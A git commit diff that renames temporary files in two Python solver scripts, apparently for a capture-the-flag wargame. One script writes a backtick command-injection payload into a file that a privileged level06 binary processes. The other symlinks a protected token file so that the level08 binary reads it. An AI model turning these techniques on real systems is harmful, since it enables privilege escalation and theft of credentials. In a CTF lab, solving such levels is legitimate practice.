f17b93b9afa6d29509760f0f753ec6b56fe1e823
Timoti Fregni <timotif@gmail.com>
2025-01-26 13:25:06 +0100

    fixed naming issue

--- level06/resources/level06.py
+++ level06/resources/level06.py
@@ -1,5 +1,6 @@
 from solver.utils import extract_flag
 
 def solve(connection):
-	connection.exec("echo '[x ${`getflag`}]'> /tmp/exploit")
-	return "", extract_flag(connection.exec("./level06 /tmp/exploit"))
+	connection.exec("echo '[x ${`getflag`}]' > /tmp/foo")
+	flag = connection.exec("./level06 /tmp/foo")
+	return "", extract_flag(flag)
--- level08/resources/level08.py
+++ level08/resources/level08.py
@@ -1,4 +1,6 @@
+from solver.utils import getflag
+
 def solve(connection):
-	connection.exec("ln -s /home/user/level08/token /tmp/exploit")
-	flag = connection.exec("./level08 /tmp/exploit")
-	return "", flag
+	connection.exec("ln -s /home/user/level08/token /tmp/bar")
+	token = connection.exec("./level08 /tmp/bar")
+	return token, getflag('08', token)
